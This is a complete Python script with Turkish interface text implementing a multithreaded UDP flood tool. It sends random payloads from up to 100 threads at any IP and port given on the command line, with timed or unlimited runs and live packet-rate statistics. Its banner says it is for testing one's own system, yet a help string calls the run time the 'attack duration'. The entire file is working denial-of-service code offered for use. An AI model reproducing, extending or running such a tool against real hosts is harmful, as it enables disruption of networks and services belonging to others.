#!/usr/bin/env python3
import sys
import time
import threading
import argparse
import signal
import socket
import atexit
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class FloodManager:
    def __init__(self, name="udp_flood"):
        self.name = name
        self.active_threads = []
        self.running = False
        self.total_packets = 0
        self.total_bytes = 0
        self.start_time = None
        self.thread_stats = {}
        self.stats_lock = threading.Lock()
        self.use_fragmentation = False

    def generate_random_payload(self, size=1024):
        return bytes(random.randint(0, 255) for _ in range(size))
    
    def create_fragmented_packet(self, payload, fragment_size=8):
        fragments = []
        for i in range(0, len(payload), fragment_size):
            fragment = payload[i:i+fragment_size]
            fragments.append(fragment)
        return fragments
    
    def flood_worker(self, worker_id, target_ip, target_port, duration=None):
        target = (target_ip, target_port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setblocking(False)
        except:
            pass
        
        packets = 0
        bytes_sent = 0
        start_time = time.time()
        
        try:
            while self.running:
                if duration and (time.time() - start_time) > duration:
                    break
                
                payload = self.generate_random_payload(size=1024)
                
                if self.use_fragmentation:
                    fragments = self.create_fragmented_packet(payload)
                    for fragment in fragments:
                        try:
                            sock.sendto(fragment, target)
                            packets += 1
                            bytes_sent += len(fragment)
                        except BlockingIOError:
                            continue
                        except Exception:
                            continue
                else:
                    try:
                        sock.sendto(payload, target)
                        packets += 1
                        bytes_sent += len(payload)
                    except BlockingIOError:
                        continue
                    except Exception:
                        continue
                
                if packets % 10000 == 0:
                    with self.stats_lock:
                        self.thread_stats[worker_id] = {
                            'packets': packets,
                            'bytes': bytes_sent,
                            'elapsed': time.time() - start_time
                        }
                    
        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            elapsed = time.time() - start_time
            
            with self.stats_lock:
                self.thread_stats[worker_id] = {
                    'packets': packets,
                    'bytes': bytes_sent,
                    'elapsed': elapsed,
                    'completed': True
                }
    
    def start_flood(self, target_ip, target_port, thread_count=10, duration=None, fragmentation=False):
        self.running = True
        self.start_time = time.time()
        self.use_fragmentation = fragmentation
        
        print(f"\n{'='*40}")
        print(f"🚀 UDP FLOOD BAŞLATILIYOR (Kendi Testiniz İçin)")
        print(f"{'='*40}")
        print(f"🎯 Hedef: {target_ip}:{target_port}")
        print(f"🧵 Thread Sayısı: {thread_count}")
        if fragmentation:
            print(f"🧩 Paket parçalama: AKTİF")
        if duration:
            print(f"⏱ Süre: {duration} saniye")
        else:
            print(f"⏱ Süre: Sınırsız (Ctrl+C ile dur)")
        print(f"🕐 Başlangıç: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*40}")
        
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            for i in range(thread_count):
                future = executor.submit(self.flood_worker, i, target_ip, target_port, duration)
                futures.append(future)
                self.active_threads.append(future)
                
            print(f"\n🎉 {thread_count} worker thread aktif!")
            print(f"💡 Durdurmak için: Ctrl+C\n")
            
            try:
                if duration:
                    remaining = duration
                    while self.running and remaining > 0:
                        self.show_duration_stats(remaining)
                        time.sleep(1)
                        remaining -= 1
                    
                else:
                    while self.running:
                        self.show_stats()
                        time.sleep(1)
                        
            except KeyboardInterrupt:
                print("\n\n⛔ Flood durduruldu (Ctrl+C)")
            finally:
                if self.running:
                    self.stop_flood()
                
                for future in futures:
                    try:
                        future.result(timeout=0.5)
                    except:
                        pass
        
        return True
    
    def stop_flood(self):
        if not self.running:
            return
            
        self.running = False
        print("\n🛑 Flood durduruluyor...")
        time.sleep(0.5)
        self.show_final_stats()
        self.active_threads.clear()
        print("✅ Tüm thread'ler durduruldu!")
    
    def show_final_stats(self):
        if not self.start_time:
            return
            
        total_packets = 0
        total_bytes = 0
        
        with self.stats_lock:
            for stats in self.thread_stats.values():
                total_packets += stats.get('packets', 0)
                total_bytes += stats.get('bytes', 0)
        
        elapsed = time.time() - self.start_time
        
        print(f"\n📊 FINAL İSTATİSTİKLER:")
        print(f"📦 Toplam Paket: {total_packets:,}")
        print(f"⏱ Toplam Süre: {elapsed:.1f}s")
        if elapsed > 0:
            pps = total_packets / elapsed
            print(f"📈 Ortalama PPS: {pps:,.0f}")
        
    def show_stats(self):
        if not self.start_time:
            return
        
        elapsed = time.time() - self.start_time
        active_count = len(self.active_threads)
        
        total_packets = 0
        with self.stats_lock:
            for stats in self.thread_stats.values():
                total_packets += stats.get('packets', 0)
        
        pps = total_packets / elapsed if elapsed > 0 else 0
        
        print(f"\r[{elapsed:.1f}s] 🧵 Thread: {active_count} | "
              f"📦 Paket: {total_packets:,} | "
              f"📈 PPS: {pps:,.0f} | "
              f"⚡ ÇALIŞIYOR", end="", flush=True)
    
    def show_duration_stats(self, remaining):
        if not self.start_time:
            return
        
        elapsed = time.time() - self.start_time
        active_count = len(self.active_threads)
        
        total_packets = 0
        with self.stats_lock:
            for stats in self.thread_stats.values():
                total_packets += stats.get('packets', 0)
        
        pps = total_packets / elapsed if elapsed > 0 else 0
        
        print(f"\r[{elapsed:.1f}s] 🧵 Thread: {active_count} | "
              f"📦 Paket: {total_packets:,} | "
              f"📈 PPS: {pps:,.0f} | "
              f"⏰ Kalan: {remaining}s", end="", flush=True)

def cleanup_on_exit():
    if 'manager' in globals() and manager and manager.running:
        manager.stop_flood()

def signal_handler(signum, frame):
    if 'manager' in globals() and manager and manager.running:
        manager.stop_flood()
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="UDP Flood Aracı - Kendi Sistem Testiniz İçin Basitleştirildi",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Kullanım Örnekleri:
  python3 flood_test.py 192.168.1.1 80 -t 20           # 20 thread
  python3 flood_test.py 192.168.1.1 80 -d 60           # 60 saniye
  python3 flood_test.py 192.168.1.1 80 --fragmentation # Paket parçalama
        """)
    
    parser.add_argument('host', help='Hedef IP adresi')
    parser.add_argument('port', type=int, help='Hedef port numarası')
    parser.add_argument('-t', '--threads', type=int, default=10,
                         help='Thread sayısı (varsayılan: 10)')
    parser.add_argument('-d', '--duration', type=int,
                         help='Saldırı süresi (saniye)')
    
    parser.add_argument('--fragmentation', action='store_true',
                         help='Paket parçalama kullan')
    
    args = parser.parse_args()
    
    global manager
    manager = FloodManager()
    
    atexit.register(cleanup_on_exit)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    if not (1 <= args.port <= 65535):
        print(f"❌ Geçersiz port: {args.port}")
        sys.exit(1)
    
    if args.threads < 1 or args.threads > 100:
        print(f"❌ Thread sayısı 1-100 arasında olmalı: {args.threads}")
        sys.exit(1)
    
    try:
        manager.start_flood(
            target_ip=args.host,
            target_port=args.port,
            thread_count=args.threads,
            duration=args.duration,
            fragmentation=args.fragmentation
        )
        
    except Exception as e:
        print(f"\n❌ Hata: {e}")
        if manager.running:
            manager.stop_flood()
        sys.exit(1)
    finally:
        if 'manager' in locals() and manager.running:
            manager.stop_flood()

if __name__ == "__main__":
    main()
